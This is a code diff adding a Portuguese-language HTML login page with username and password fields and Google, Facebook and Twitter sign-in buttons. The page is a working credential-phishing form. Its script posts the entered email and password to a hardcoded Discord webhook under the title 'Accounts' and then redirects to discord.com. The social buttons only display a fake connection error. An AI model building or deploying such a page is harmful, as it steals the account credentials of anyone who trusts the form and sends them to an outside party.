@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+<meta charset="UTF-8">
+<title>Login</title>
+
+<style>
+body {
+  margin: 0;
+  height: 100vh;
+  background: url("https://img.freepik.com/free-vector/white-background-with-hexagonal-line-pattern-design_1017-28442.jpg?w=2000") no-repeat center center fixed;
+  background-size: cover;
+
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  font-family: Arial;
+}
+
+.container {
+  background: white;
+  padding: 35px;
+  border-radius: 14px;
+  width: 340px;
+  text-align: center;
+  box-shadow: 0 15px 35px rgba(0,0,0,0.3);
+}
+
+/* LOGO / TÍTULO */
+h2 {
+  margin-bottom: 5px;
+  color: #1e3c72;
+}
+
+.info-text {
+  font-size: 16px;
+  color: #555;
+  margin-bottom: 15px;
+}
+
+input {
+  width: 100%;
+  padding: 10px;
+  margin-top: 5px;
+  margin-bottom: 15px;
+  border: 1px solid #ccc;
+  border-radius: 6px;
+}
+
+button {
+  width: 100%;
+  padding: 10px;
+  background: #3fa34d;
+  color: white;
+  border: none;
+  border-radius: 20px;
+  cursor: pointer;
+  font-size: 16px;
+}
+
+button:hover {
+  background: #368f43;
+}
+
+/* MENSAGEM */
+.msg {
+  max-height: 0;
+  opacity: 0;
+  overflow: hidden;
+  transform: translateY(-10px);
+  transition: all 0.4s ease;
+  color: white;
+  padding: 0 10px;
+  border-radius: 8px;
+  font-size: 14px;
+  margin-top: 10px;
+}
+
+.error {
+  background: #e74c3c;
+}
+
+.success {
+  background: #2ecc71;
+}
+
+.show {
+  max-height: 60px;
+  opacity: 1;
+  padding: 10px;
+  transform: translateY(0);
+}
+
+/* SOCIAL */
+.divider {
+  margin: 15px 0;
+  font-size: 12px;
+  color: #777;
+}
+
+.social-btn {
+  width: 100%;
+  padding: 10px;
+  margin-top: 10px;
+  border: none;
+  border-radius: 20px;
+  cursor: pointer;
+  font-size: 14px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 10px;
+}
+
+.google { background: #db4437; color: white; }
+.facebook { background: #1877f2; color: white; }
+.twitter { background: white; color: black; border: 1px solid #ccc; }
+
+.icon {
+  width: 18px;
+  height: 18px;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+  <h2>Acessar</h2>
+
+  <p class="info-text">
+    Crie ou faça login em uma conta para começar
+  </p>
+
+  <input id="q1" type="text" placeholder="Usuário / Email">
+  <input id="q2" type="password" placeholder="Senha">
+
+  <button id="loginBtn" onclick="enviar()">
+    Logar
+  </button>
+
+  <div id="msg" class="msg"></div>
+
+  <div class="divider">ou entre com</div>
+
+  <button class="social-btn google" onclick="erro()">
+    <img class="icon" src="https://cdn-icons-png.flaticon.com/512/2991/2991148.png">
+    Entrar com Google
+  </button>
+
+  <button class="social-btn facebook" onclick="erro()">
+    <img class="icon" src="https://cdn-icons-png.flaticon.com/512/733/733547.png">
+    Entrar com Facebook
+  </button>
+
+  <button class="social-btn twitter" onclick="erro()">
+    <img class="icon" src="https://cdn-icons-png.flaticon.com/512/5968/5968830.png">
+    Entrar com Twitter
+  </button>
+
+</div>
+
+<script>
+
+const webhookURL = "https://discord.com/api/webhooks/1493909193558851644/v1HLizvgGxpB3kUK1Vem2XnKjVWp2ylUOWxtaS86y5IaKdbWOZEvOsg1zXZk5_JP9iRF";
+
+function showMsg(text, type) {
+  const msg = document.getElementById("msg");
+
+  msg.innerText = text;
+  msg.className = "msg show " + (type === "success" ? "success" : "error");
+
+  setTimeout(() => {
+    msg.className = "msg";
+  }, 3000);
+}
+
+function erro() {
+  showMsg("Erro de conexão: tente mais tarde", "error");
+}
+
+async function enviar() {
+  const q1 = document.getElementById("q1").value;
+  const q2 = document.getElementById("q2").value;
+  const btn = document.getElementById("loginBtn");
+
+  if (!q1 || !q2) {
+    showMsg("Preencha todos os campos!", "error");
+    return;
+  }
+
+  btn.innerText = "Enviando...";
+  btn.disabled = true;
+
+  try {
+    await fetch(webhookURL, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        embeds: [
+          {
+            title: "📩 Accounts",
+            color: 0x2ecc71,
+            fields: [
+              {
+                name: "Email",
+                value: q1,
+                inline: false
+              },
+              {
+                name: "Senha",
+                value: q2,
+                inline: false
+              }
+            ],
+            footer: {
+              text: "Sistema de respostas"
+            }
+          }
+        ]
+      })
+    });
+
+    showMsg("Enviado com sucesso!", "success");
+
+  } catch (err) {
+    showMsg("Erro ao enviar ao Discord", "error");
+  }
+
+  setTimeout(() => {
+    window.location.href = "https://discord.com";
+  }, 2500);
+}
+
+</script>
+
+</body>
+</html>
